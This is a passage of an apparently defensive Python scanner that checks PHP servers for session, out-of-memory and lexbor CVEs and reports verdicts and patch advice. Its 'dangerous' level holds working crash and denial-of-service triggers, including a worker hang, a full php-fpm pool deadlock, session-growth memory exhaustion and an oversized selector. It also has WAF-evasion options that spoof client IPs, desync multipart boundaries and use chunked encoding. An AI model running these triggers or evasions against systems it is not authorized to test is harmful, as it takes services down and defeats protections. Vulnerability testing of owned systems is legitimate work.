    elif down >= 2:
        log(bad(f"[dangerous] CVE-2026-109619: with {args.wedge_cap} consumers held, fresh "
                "requests block pool-wide -> pool DEADLOCKED -> VULNERABLE (restart php-fpm)"))
        rep.set("core_109619", verdict=V_CONFIRMED, confidence="observed",
                level="dangerous", active_outcome="crash",
                active_reason=f"fresh requests blocked pool-wide while {args.wedge_cap} "
                              "consumers were held (workers deadlocked on the stale PS(id))",
                reason="pool-wide session deadlock: fresh requests blocked under hold")
    else:
        log(warn(f"[dangerous] CVE-2026-109619: {args.wedge_cap} held consumers did NOT "
                 "drain the pool -- patched, non-reusing scatter, or pool > --wedge-cap. "
                 "Version verdict stands."))
        rep.active("core_109619", "no-crash",
                   f"could not drain the pool with {args.wedge_cap} held consumers "
                   "(patched, non-reusing scatter, or pool > --wedge-cap)")


def _fpm_growth_probe(args, base, rep, log):
    """fpm sink-free PATCH-STATE oracle (CVE-2026-109619). Grow a session via
    cleanup=On-defeating accumulation records until a benign same-SID touch flips to a caught
    OOM. The flip is a DEFINITIVE VULNERABLE signal: verified black-box on fpm+nginx, it fires
    on vuln 8.3.26 (session grows to ~10MB, flip ~record 24) and NEVER on patched 8.3.36 (the
    fix makes the parser OOM fallible/delayed so cleanup deletes each record; session stays 0B).
    A patched build cannot produce it. No-flip leans patched but is not definitive (the primitive
    may not apply: 8.4.x cheap-field parse, or memory_limit too high for the record budget).
    Non-crashing (caught OOM, worker survives)."""
    post_url = base + "/" + args.post_path.lstrip("/")
    mint_url = base + "/" + args.path.lstrip("/")

    _bnd = b"BNDgrow"

    def _mp(parts):
        # record_parts yields BYTES (name, value, filename) tuples; `part` encodes bytes and
        # keeps filename="" (the empty-filename wall). part_tuple would str()-ify the bytes and
        # mangle the empty filename, breaking the OOM-wall.
        body = b"".join(_mpart(n, v, filename=fn, ctype="application/octet-stream", boundary=_bnd)
                        for n, v, fn in parts) + _mterm(_bnd)
        return body, {"Content-Type": "multipart/form-data; boundary=" + _bnd.decode()}

    def mint():
        st, hdrs, _ = http_full(mint_url, timeout=args.req_timeout)
        sc = {k.lower(): v for k, v in (hdrs or {}).items()}.get("set-cookie", "")
        m = re.search(r"PHPSESSID=([A-Za-z0-9,\-]+)", sc or "")
        return m.group(1) if m else ("det" + os.urandom(13).hex())  # fallback (use_strict_mode=Off)

    def post(parts, cookie):
        body, headers = _mp(parts)
        headers = dict(headers)
        headers["Cookie"] = cookie
        _, b = http(post_url, data=body, headers=headers, timeout=args.req_timeout)
        return b or b""

    log(dim(f"[dangerous] fpm accumulation probe: growing a session via {args.post_path} "
            f"(cleanup=On defeat), up to {args.fpm_growth_records} records ..."))
    v = detect_growth(mint, post, max_records=args.fpm_growth_records)
    if v["affected"]:
        log(bad(f"[dangerous] CVE-2026-109619: session-touch OOM-flip after "
                f"{v['flip_record'] + 1} records -> VULNERABLE under cleanup=On (a patched "
                "build can't accumulate). CAVEAT: under cleanup=Off the flip fires on patched "
                "too -- then affected-class, not patch-state."))
        rep.vote("fpm_accumulation",
                 f"session-growth OOM-flip after {v['flip_record'] + 1} records",
                 bears_on_patch=True,
                 implies=V_CONFIRMED + " IF cleanup=On (patched can't accumulate); if cleanup=Off "
                         "it is affected-class only",
                 confidence="high (verified patch differential under cleanup=On)")
        rep.set("core_109619", verdict=V_CONFIRMED, confidence="observed (cleanup=On)",
                level="dangerous", active_outcome="crash",
                active_reason="session-growth accumulation OOM-flip -- a definitive sink-free fpm "
                              "vulnerable signal UNDER cleanup=On (a patched build cannot "
                              "accumulate); with cleanup=Off it is affected-class only")
    elif v["affected"] is None:
        log(warn(f"[dangerous] CVE-2026-109619: {v['note']}"))
        rep.vote("fpm_accumulation", "accumulation probe inconclusive",
                 bears_on_patch=False, implies=v["note"], confidence="n/a")
    else:
        log(warn(f"[dangerous] CVE-2026-109619: no OOM-flip in {v['records']} records -- "
                 "leans PATCHED but not definitive (primitive may not apply: 8.4.x cheap-field "
                 "parse, or memory_limit too high -- raise --fpm-growth-records). Version stands."))
        rep.vote("fpm_accumulation", f"no OOM-flip in {v['records']} records",
                 bears_on_patch=False,
                 implies="leans patched (cannot accumulate) OR primitive N/A this regime",
                 confidence="low")


def _test_109619(args, base, rep, log):
    path = base + "/" + args.post_path.lstrip("/")
    sid_a = b"0a" * 16

    victim = [part_tuple("victim", b"V" * 256, filename="v.bin",
                         ctype="application/octet-stream")]

    # R1 producer: publish SID_A upload-progress state and reach the pre-RINIT OOM
    # so BG(unserialize)/PS(id) is left dangling. The part count to exhaust the
    # memory_limit scales with it (~40k parts per 16M), so a fixed count silently
    # fails to arm on a big memory_limit (64M/512M) -- AUTO-GROW until the producer
    # stops returning 200 (OOM reached), bounded by --max-body-mb and --parts-cap.
    nparts, armed, st1 = args.parts, False, None
    while True:
        pb, ph = multipart_default(progress_preamble(sid_a) + list(file_parts(nparts, name_len=16)))
        mb = len(pb) / 1024 / 1024
        if mb > args.max_body_mb:
            log(warn(f"[dangerous] 109619: producer would need ~{mb:.0f}MB (> --max-body-mb "
                     f"{args.max_body_mb}) to OOM at {nparts} parts -- memory_limit too high "
                     "to arm within the wire budget. Raise --max-body-mb/--parts-cap."))
            break
        log(dim(f"[dangerous] 109619: R1 producer, {nparts} parts (~{mb:.1f}MB), "
                f"per-req cap {args.req_timeout:.0f}s ..."))
        st1, b1 = http(path, data=pb, headers=ph, timeout=args.req_timeout)
        if st1 in (413, 400):               # post_max_size rejected the body, not an OOM
            log(warn(f"[dangerous] 109619: producer hit post_max_size (HTTP {st1}) at "
                     f"~{mb:.1f}MB before the OOM -- can't arm by wire (post_max < memory_limit)."))
            break
        if waf_detect.is_interference(waf_detect.classify(st1, {}, b1)) or st1 == 503:
            log(warn(f"[dangerous] 109619: producer response is a WAF block (HTTP {st1}), "
                     "not an OOM -- can't arm through the WAF. Re-run with --waf-bypass."))
            rep.active("core_109619", "waf-blocked",
                       f"producer WAF-blocked (HTTP {st1}), not armed -- use --waf-bypass")
            return
        if st1 is None or (isinstance(st1, int) and st1 >= 500):  # OOM/parse failure => armed
            armed = True
            log(dim(f"[dangerous] 109619: producer OOMed at {nparts} parts (HTTP {st1}) "
                    "-- dangle armed"))
            break
        if nparts >= args.parts_cap:
            log(warn(f"[dangerous] 109619: producer still 200 at the {args.parts_cap}-part cap "
                     "-- PHP caps parts at max_multipart_body_parts (~30020), so a high "
                     "memory_limit can't be OOMed by flat parts. Using the session-growth oracle."))
            log(dim('[dangerous]   owner: confirm the cap in the error log -- "Multipart body '
                    'parts limit exceeded" or "Maximum number of allowable file uploads exceeded".'))
            break
        nparts = min(nparts * 2, args.parts_cap)
    if not armed:
        rep.active("core_109619", "not-armed",
                   "producer never reached the pre-RINIT OOM within the wire/parts budget "
                   "(memory_limit too high for post_max_size, or capped) -- UAF not armed")
        return

    # R2 consumer: next upload-progress on SID_A reuses the stale PS(id)
    log(dim(f"[dangerous] 109619: R2 consumer on SID_A (hang cap {args.hang_timeout:.0f}s; "
            "a stall is the vulnerable signal) ..."))
    cons_body, cons_h = multipart_default(progress_preamble(sid_a) + victim)
    t0 = time.time()
    st2, _ = http(path, data=cons_body, headers=cons_h, timeout=args.hang_timeout)
    dt = time.time() - t0
    hung = (st2 is None and dt >= args.hang_timeout - 1)
    log(f"[dangerous] CVE-2026-109619: R1 HTTP {st1}; R2 HTTP {st2} in {dt:.1f}s")
    if hung:
        log(bad("[dangerous] CVE-2026-109619: R2 HUNG -> VULNERABLE"))
        rep.set("core_109619", verdict=V_CONFIRMED, confidence="observed",
                level="dangerous", active_outcome="crash",
                active_reason="R2 consumer hung on the stale PS(id)",
                reason="R2 consumer hung on the stale PS(id)")
        return

    # Escalate: one wedged worker is invisible on a pool, so drain the whole pool
    # and watch for a fresh request to block (the coordinator's model of how the
    # site-wide stall actually arises).
    if args.drain_pool:
        log(dim("[dangerous] 109619: single consumer did not hang -- escalating to the "
                "opt-in pool-drain."))
        _pool_drain_probe(args, base, rep, log)
    else:
        log(warn("[dangerous] CVE-2026-109619: single consumer did not hang -- UAF not "
                 "demonstrated (try --drain-pool). Version verdict stands."))
        rep.active("core_109619", "no-crash",
                   "single consumer did not hang (expected sink-free on fpm; "
                   "--drain-pool available to attempt a full-pool demonstration)")


def _test_lexbor_contains(args, base, rep, log):
    sink = args.selector_sink
    payload = "A" * args.selector_len
    sel = ':lexbor-contains("' + payload + '")'
    probe = sink.replace("{}", _urlq(sel)) if "{}" in sink else sink + _urlq(sel)
    # baseline: benign selector confirms the sink is live
    bsel = ':lexbor-contains("ok")'
    bprobe = sink.replace("{}", _urlq(bsel)) if "{}" in sink else sink + _urlq(bsel)
    bst, _ = http(bprobe, timeout=args.timeout)
    log(f"[dangerous] lexbor contains: baseline selector -> HTTP {bst}")
    st, _ = http(probe, timeout=args.timeout)
    # a crash shows as a reset/timeout (None) or the sink host going dead
    log(f"[dangerous] lexbor contains: oversized selector ({args.selector_len}B) "
        f"-> HTTP {st}")
    if st is None:
        rep.set("lexbor_contains", verdict=V_CONFIRMED, confidence="observed",
                level="dangerous",
                reason="worker died on oversized :lexbor-contains() selector")
    else:
        rep.active("lexbor_contains", "no-crash",
                   "selector sink survived; patched, or the overflow did not fault "
                   "this build/length -- raise --selector-len")


# --------------------------------------------------------------------------- #
# local (operator has shell on their own box)
# --------------------------------------------------------------------------- #
def local_probes(args, fp, rep, log):
    import subprocess
    log("[local] reading the live build + INI (php -v / php -i)")
    try:
        v = subprocess.run(["php", "-v"], capture_output=True, text=True, timeout=15)
        log("[local] " + (v.stdout.splitlines()[0] if v.stdout else v.stderr[:120]))
        pv = vv.parse_version(v.stdout)
        if pv:
            core = vv.verdict(pv)
            log(f"[local] exact-version core verdict: {core['verdict']} ({core['reason']})")
            rep.set("core_109618", local_version=".".join(map(str, pv)),
                    local_verdict=core["verdict"])
            rep.note("local php -v gives the exact build; still subject to distro "
                     "backports that keep the version string")
    except Exception as e:
        log(f"[local] php -v unavailable ({e.__class__.__name__})")
    # INI facts
    try:
        i = subprocess.run(["php", "-i"], capture_output=True, text=True, timeout=20)
        for key in ("memory_limit", "session.upload_progress.enabled",
                    "session.upload_progress.cleanup", "session.save_path",
                    "display_errors", "expose_php"):
            m = re.search(rf"^{re.escape(key)}\s*=>\s*(.+)$", i.stdout, re.M)
            if m:
                log(f"[local] {key} => {m.group(1).strip()}")
    except Exception as e:
        log(f"[local] php -i unavailable ({e.__class__.__name__})")
    # session dir: oversized sess_* = the accumulation attack grew a session (normal sessions
    # are tiny); many leftover sess_*/php* temp files with cleanup=Off = accumulation residue.
    try:
        save = None
        i2 = subprocess.run(["php", "-i"], capture_output=True, text=True, timeout=10)
        m = re.search(r"^session\.save_path\s*=>\s*(.+?)\s*=>", i2.stdout, re.M)
        if m and m.group(1).strip() not in ("", "no value"):
            save = m.group(1).strip().split(";")[-1]
        for d in ([save] if save else []) + ["/tmp", "/var/lib/php/sessions"]:
            if not d or not os.path.isdir(d):
                continue
            sess = [os.path.join(d, f) for f in os.listdir(d) if f.startswith("sess_")]
            big = [f for f in sess if _safe_size(f) > 1024 * 1024]
            if sess:
                log(f"[local] session dir {d}: {len(sess)} sess_* files, "
                    f"{len(big)} over 1MB (max {max((_safe_size(f) for f in sess), default=0)//1024}KB)")
                if big:
                    log(bad("[local] oversized session file(s) present -> consistent with the "
                            "CVE-2026-109619 accumulation attack (normal sessions are tiny). "
                            "Inspect/clear them and audit the logs for the trigger shapes."))
                    rep.vote("local_session_residue", f"{len(big)} session file(s) > 1MB",
                             bears_on_patch=False,
                             implies="accumulation attack residue (affected-class surface used)",
                             confidence="medium -- confirm these are not a legitimate large session")
                break
    except Exception as e:
        log(f"[local] session-dir inspect skipped ({e.__class__.__name__})")
    log("[local] (also check your fpm/php/apache error log yourself -- see the owner-log "
        "checklist the tool prints for fpm/apache targets)")


def _safe_size(path):
    try:
        return os.path.getsize(path)
    except OSError:
        return 0


# --------------------------------------------------------------------------- #
# WordPress-core sink mode
# --------------------------------------------------------------------------- #
def wp_section(args, fp, rep, log):
    """What WordPress core adds to detection (honest): target + version
    confirmation and a guaranteed PHP-executing POST endpoint for the behavioral
    probe. It does NOT reveal the PHP patch version, and core has no
    unauthenticated unserialize sink -- so it does not hand a sink-free fpm crash
    differential. The one core path that engages the bug machinery is the
    wp-login resetpass Set-Cookie over-read (routes/wordpress/resetpass_*),
    which is offset/SAPI-specific and not a clean black-box detector."""
    wp_base = (args.wp_url or args.url).rstrip("/")
    wp = detect_wordpress(http_full, wp_base)
    if not wp["is_wp"]:
        log(f"[wordpress] no WordPress detected at {wp_base} "
            "(try --wp-url with the correct base path)")
        rep.vote("wordpress", "not detected", bears_on_patch=False,
                 implies="WP sink mode had no effect", confidence="n/a")
        return
    wv = wp["wp_version"] or "unknown"
    log(f"[wordpress] WordPress confirmed (version {wv}); signals: {', '.join(wp['signals'])}")
    log(f"[wordpress] endpoints: {wp['endpoints']}")
    rep.vote("wordpress", f"WordPress {wv} confirmed", bears_on_patch=False,
             implies="affected-class target + reachable PHP endpoints (WP version is "
                     "NOT the PHP patch version)", confidence="high")
    rep.set("wordpress", version=wv, endpoints=wp["endpoints"])

    # point the behavioral/OOM probe at a guaranteed-PHP endpoint under the WP
    # base (page caches serve '/' without PHP; wp-login.php always executes).
    chosen = next((ep for ep in POST_ENDPOINTS if ep in wp["endpoints"]), None)
    if chosen:
        rel = wp_base[len(args.url.rstrip("/")):].lstrip("/")
        args.post_path = (rel + "/" + chosen).lstrip("/") if rel else chosen
        log(f"[wordpress] behavioral/OOM probe retargeted to '{args.post_path}' "
            "(always hits PHP, unlike a cached front page)")
    log("[wordpress] NOTE: WP discloses its own version, not the PHP patch version, and "
        "has no unauth unserialize() sink -- it gives a reliable PHP endpoint, not a "
        "patch-state oracle. Verdict rides the version banner.")
    rep.note("WordPress mode confirmed the target and gave a reliable PHP endpoint; "
             "it did not add a PHP patch-state oracle (no unauthenticated core "
             "unserialize sink; WP version != PHP version).")


# --------------------------------------------------------------------------- #
# driver
# --------------------------------------------------------------------------- #
def _waf_recommendation(rep):
    """One-line '-> re-run with --waf-bypass' hint when a WAF/CDN was detected and
    the active tests could not get a clean signal through it. None otherwise."""
    if not getattr(rep, "waf", None):
        return None
    outcomes = {f.get("active_outcome") for f in rep.findings.values()}
    if "crash" in outcomes:
        return None                              # a crash landed despite the WAF
    blocked = "waf-blocked" in outcomes
    inconclusive = outcomes & {"waf-blocked", "no-crash", "not-armed",
                               "ambiguous", "no-oom-reached"}
    if not (blocked or inconclusive):
        return None
    return (f"{rep.waf} WAF/CDN in front and the active tests were "
            f"{'WAF-blocked' if blocked else 'inconclusive'} -- re-run with --waf-bypass "
            "(add --waf-boundary-desync and/or --waf-chunked) to get a signal through it.")


def summarize(rep, as_json):
    labels = {"core_109618": "CVE-2026-109618 (OOM half-built-state)",
              "core_109619": "CVE-2026-109619 (stale-global dangle)",
              "lexbor_contains": "lexbor :lexbor-contains() overflow",
              "lexbor_idna": "lexbor IDNA heap over-read"}
    rec = _waf_recommendation(rep)
    if as_json:
        print(json.dumps({"findings": rep.findings, "notes": rep.notes,
                          "votes": rep.votes,
                          "contradictions": _contradictions(rep),
                          "waf": rep.waf, "recommendation": rec}, indent=2))
        return

    if rep.votes:
        print("\n" + bold("============ CONFIDENCE PANEL (independent oracles) ============"))
        print(dim("  'decisive' = can settle patched-vs-vulnerable; 'context' = only"))
        print(dim("  corroborates the affected class / recovers config. Read each"))
        print(dim("  oracle's '=> ...' line for what it actually concluded."))
        for v in rep.votes:
            kind = "decisive" if v["bears_on_patch_state"] else "context "
            print(f"  - ({kind}) {bold(v['oracle'])}: {v['finding']}")
            print(dim(f"        => {v['implies']}  [confidence: {v['confidence']}]"))

    print("\n" + bold("==================== VERDICT ===================="))
    print(dim("  'verdict' is the governing (version-based) finding. 'active test' is a"))
    print(dim("  separate black-box crash attempt: it can only UPGRADE to VULNERABLE on an"))
    print(dim("  observed crash -- a non-crash never downgrades the version verdict."))
    for bug_id, lbl in labels.items():
        f = rep.findings.get(bug_id, {})
        v = f.get("verdict", "n/a")
        print(f"  {lbl}")
        print(f"      verdict:    {verdict_color(v)}  "
              + dim(f"(confidence: {f.get('confidence', 'n/a')}, level: {f.get('level', 'n/a')})"))
        if f.get("reason"):
            print(dim(f"      reason:     {f['reason']}"))
        ao = f.get("active_outcome")
        if ao:
            if ao == "crash":
                tag = bad("crash confirmed")
            elif ao == "accumulation-surface-live":
                tag = bad("AFFECTED: accumulation surface live")
            else:
                tag = warn(ao)
            print(f"      active test: {tag}" + dim(f" -- {f.get('active_reason', '')}"))
        if f.get("reachable") is False:
            print(dim("      note:       trigger path reported disabled"))

    contra = _contradictions(rep)
    if contra:
        print("  ----------------------------------------------")
        print(warn("  CONTRADICTIONS / CAVEATS (truthful reconciliation):"))
        for c in contra:
            print(warn(f"    ! {c}"))
    print("  ----------------------------------------------")
    print("  All four are closed by one upgrade to the 8.2.35/8.3.36/8.4.27/8.5.12 line.")
    if rec:
        print(warn(f"  RECOMMENDATION: {rec}"))
    for n in rep.notes:
        print(dim(f"  note: {n}"))
    print(bold("================================================="))


def _contradictions(rep):
    """Reconcile the oracle panel honestly. Returns human-readable strings for
    any signal that could be misread as disagreeing with the governing verdict."""
    out = []
    core = rep.findings.get("core_109618", {}).get("verdict")
    oom_shapes = [v for v in rep.votes if v["oracle"] == "oom_shape"]
    if oom_shapes and core == vv.LIKELY_PATCHED:
        out.append("the OOM returned a 502/empty-500 (which naive scanners call a "
                   "'crash'), but on fpm patched builds do this too -- it does NOT "
                   "contradict the version's LIKELY_PATCHED verdict.")
    nocrash = {"no-crash", "no-oom-reached", "n/a-on-fpm", "blocked", "skipped",
               "not-armed", "ambiguous", "waf-blocked"}
    if core == vv.LIKELY_VULNERABLE and \
            rep.findings.get("core_109619", {}).get("active_outcome") in nocrash:
        out.append("the version is unpatched (LIKELY_VULNERABLE), but the sink-free "
                   "black-box active test could NOT demonstrate a crash under this "
                   "SAPI/config -- expected on fpm without an app unserialize sink, "
                   "and also what a mitigation (memory_limit=-1, upload_progress off) "
                   "would produce. The binary is affected; exploitability here is "
                   "unproven, NOT disproven. Patch regardless.")
    if any(v["oracle"] == "version_banner" and v["implies"] == vv.UNKNOWN
           for v in rep.votes):
        out.append("PHP version is not disclosed and no behavioral probe can "
                   "recover the exact minor version, so patch state is UNKNOWN; the "
                   "behavioral oracles only confirm this is an affected-class PHP "
                   "target. Supply --php-version (confirmed out of band) to decide.")
    return out


def main():
    ap = argparse.ArgumentParser(
        description=__doc__.splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", required=True, help="target base URL")
    ap.add_argument("--level", choices=["passive", "soft", "dangerous"],
                    default="passive", help="deepest level to run (cumulative)")
    ap.add_argument("--i-own-this", action="store_true",
                    help="required for --level dangerous: you own / are authorized "
                         "to test this target and accept a possible transient worker "
                         "crash if it is vulnerable")
    ap.add_argument("--path", default="index.php",
                    help="PHP page for the passive fingerprint GET and the "
                         "worker-alive check (default index.php)")
    ap.add_argument("--post-path", default=None,
                    help="PHP page the dangerous OOM triggers POST to (default: "
                         "same as --path; labs use poc.php)")
    ap.add_argument("--sapi", choices=["fpm", "apache", "cli-server"], default=None,
                    help="override SAPI when the banner does not reveal it")
    ap.add_argument("--php-version", default=None,
                    help="override PHP version X.Y.Z (confirmed out of band)")
    ap.add_argument("--phpinfo-url", default=None,
                    help="URL of a reachable phpinfo() page (passive, high-signal)")
    ap.add_argument("--wordpress", action="store_true",
                    help="WordPress-core sink mode: confirm WP + recover WP version, "
                         "and point the behavioral probe at a guaranteed PHP endpoint "
                         "(wp-login.php) that page caches do not serve")
    ap.add_argument("--wp-url", default=None,
                    help="WordPress base URL if not the root (e.g. http://host/blog); "
                         "default: --url")
    ap.add_argument("--local", action="store_true",
                    help="also run on-box probes (php -v / php -i)")
    ap.add_argument("--behavioral", action="store_true", default=True,
                    help="run black-box behavioral corroboration probes (OOM-flip "
                         "recovery); on by default at --level soft/dangerous")
    ap.add_argument("--no-behavioral", dest="behavioral", action="store_false",
                    help="skip the behavioral probes (no transient fpm child respawns)")
    ap.add_argument("--flip-cap-kb", type=int, default=16384,
                    help="largest POST field (KB) the OOM-flip probe will try")
    ap.add_argument("--json", action="store_true", help="machine-readable output")
    # dangerous-trigger knobs
    ap.add_argument("--parts", type=int, default=40000,
                    help="starting flat file-part count for the CVE-2026-109619 producer; "
                         "auto-grows until the producer OOMs (scales with memory_limit)")
    ap.add_argument("--parts-cap", type=int, default=500000,
                    help="safety ceiling on the producer part count (the wire budget "
                         "--max-body-mb is the real governor). Note PHP truncates parts at the "
                         "target's max_multipart_body_parts, so past that more parts don't help.")
    ap.add_argument("--idx-len", type=int, default=IDX_LEN,
                    help="nested-index length (bytes) per upload part for the "
                         "CVE-2026-109618 trigger")
    ap.add_argument("--pad-cap", type=int, default=4096,
                    help="max padding fields while locating the OOM crossing")
    ap.add_argument("--step", type=int, default=4,
                    help="padding fields per CVE-2026-109618 sweep step")
    ap.add_argument("--span", type=int, default=96,
                    help="CVE-2026-109618 sweep this many pad fields past the crossing")
    ap.add_argument("--timeout", type=float, default=60.0,
                    help="default socket timeout for non-probe requests")
    ap.add_argument("--req-timeout", type=float, default=20.0,
                    help="per-request timeout for the (possibly slow) OOM probes")
    ap.add_argument("--stale-timeout", type=float, default=120.0,
                    help="wall-clock budget per sub-test; on exceeding it the sub-test "
                         "is skipped and whatever was learned is reported (0 = no budget)")
    ap.add_argument("--max-body-mb", type=float, default=32.0,
                    help="stop growing the CVE-2026-109618 probe body past this size "
                         "(prevents huge uploads to a remote target)")
    ap.add_argument("--hang-timeout", type=float, default=20.0,
                    help="R2 consumer timeout; a stall this long = hang signal")
    ap.add_argument("--lock-timeout", type=float, default=8.0,
                    help="fresh-request probe timeout during the pool-drain; a stall "
                         "this long after draining = the pool is deadlocked")
    ap.add_argument("--drain-pool", action="store_true", default=False,
                    help="OPT-IN escalation when the single consumer does not hang: "
                         "hold many concurrent consumers to try to occupy every worker "
                         "until a fresh request blocks. Full-pool DoS; unreliable "
                         "sink-free (wedging needs serial producer->consumer pairing on "
                         "one worker, which concurrency scatters), so default OFF.")
    ap.add_argument("--wedge-cap", type=int, default=20,
                    help="pool-drain: number of concurrent consumers to hold")
    ap.add_argument("--fpm-growth", action="store_true", default=True,
                    help="fpm: run the session-growth accumulation 'Affected' oracle (grow a "
                         "session until a benign touch flips to a caught OOM) -- default on")
    ap.add_argument("--no-fpm-growth", dest="fpm_growth", action="store_false",
                    help="skip the fpm session-growth accumulation oracle")
    ap.add_argument("--fpm-growth-records", type=int, default=40,
                    help="max accumulation records before giving up on the OOM-flip")
    ap.add_argument("--alive-timeout", type=float, default=8.0)
    ap.add_argument("--color", choices=["auto", "always", "never"], default="auto",
                    help="colorize output (auto = only on a TTY and not --json)")
    # lexbor sinks (application-gated)
    ap.add_argument("--selector-sink", default=None,
                    help="querySelector sink URL with {} for the selector "
                         "(lexbor contains-overflow crash oracle; dangerous)")
    ap.add_argument("--url-parse-sink", default=None,
                    help="Uri\\WhatWg\\Url::parse()+reflect sink URL with {} for the "
                         "URL (lexbor IDNA soft confirm; non-destructive)")
    ap.add_argument("--selector-len", type=int, default=16384)
    ap.add_argument("--idna-labels", type=int, default=600)
    ap.add_argument("--idna-trials", type=int, default=8)
    # WAF-bypass / evasion (authorized targets only -- spoofs the client, not the target)
    waf = ap.add_argument_group("WAF-bypass (evasion to reach PHP past a filtering layer)")
    waf.add_argument("--waf-bypass", action="store_true",
                     help="enable the default evasion bundle: browser User-Agent, "
                          "X-Forwarded-For/X-Real-IP client-IP spoof, and Content-Type "
                          "case+charset jitter (does NOT enable chunked)")
    waf.add_argument("--waf-header", action="append", metavar="K:V", default=None,
                     help="add a request header to every probe (repeatable)")
    waf.add_argument("--waf-ua", default=None, metavar="UA",
                     help="set the User-Agent (default browser UA under --waf-bypass)")
    waf.add_argument("--waf-xff", default=None, metavar="IP",
                     help="spoof client IP via X-Forwarded-For/X-Real-IP/... "
                          "(default 127.0.0.1 under --waf-bypass)")
    waf.add_argument("--waf-ct-jitter", action="store_true",
                     help="randomize Content-Type token case + append charset "
                          "(boundary preserved; defeats naive CT signatures)")
    waf.add_argument("--waf-boundary-desync", nargs="?", const="dup", default=None,
                     choices=["dup", "quote", "space", "combo"], metavar="FORM",
                     help="rewrite the multipart boundary so a WAF's parser diverges "
                          "from PHP's (PHP keeps parsing): dup=real+decoy boundary "
                          "(default), quote=quoted, space=space-before-eq, combo=all. "
                          "Forms verified PHP-safe on 8.4.26; WAF effect is parser-specific")
    waf.add_argument("--waf-chunked", action="store_true",
                     help="stream POST bodies with Transfer-Encoding: chunked (no "
                          "Content-Length); defeats CL body scanners / size caps. http only")
    waf.add_argument("--waf-chunk-size", type=int, default=1024, metavar="N",
                     help="chunk size (bytes) for --waf-chunked (default 1024)")
    args = ap.parse_args()
    if args.post_path is None:
        args.post_path = args.path

    global _USE_COLOR
    _USE_COLOR = (args.color == "always" or
                  (args.color == "auto" and not args.json and sys.stdout.isatty()))

    log = (lambda m: None) if args.json else (lambda m: print(m))
    rep = Report()

    # WAF-bypass: rebind the module-global transports so every probe inherits the
    # evasion transforms (header spoof / Content-Type jitter / chunked TE). The
    # multipart body bytes are untouched, so the OOM-trigger framing is preserved.
    waf = WafProfile.from_args(args)
    if waf.enabled:
        globals()["http"] = waf.wrap_http(http)
        globals()["http_full"] = waf.wrap_http_full(http_full)
        log(dim("[detect] WAF-bypass active: " + waf.summary()))
        rep.note("WAF-bypass transforms active: " + waf.summary())

    if args.level == "dangerous" and not args.i_own_this:
        raise SystemExit("[detect] --level dangerous requires --i-own-this "
                         "(it can transiently crash a vulnerable worker)")

    try:
        fp = l1_passive(args, rep, log)
        if args.wordpress:
            wp_section(args, fp, rep, log)
        if args.local:
            local_probes(args, fp, rep, log)
        if args.level in ("soft", "dangerous"):
            l2_soft(args, fp, rep, log)
        if args.level == "dangerous":
            l3_dangerous(args, fp, rep, log)
    except KeyboardInterrupt:
        log(warn("\n[detect] interrupted (Ctrl-C) -- reporting partial results below"))
    except Exception as e:
        log(warn(f"\n[detect] aborted: {e.__class__.__name__}: {e} "
                 "(target unreachable or response broke mid-request) "
                 "-- reporting partial results below"))

    summarize(rep, args.json)


if __name__ == "__main__":
    main()
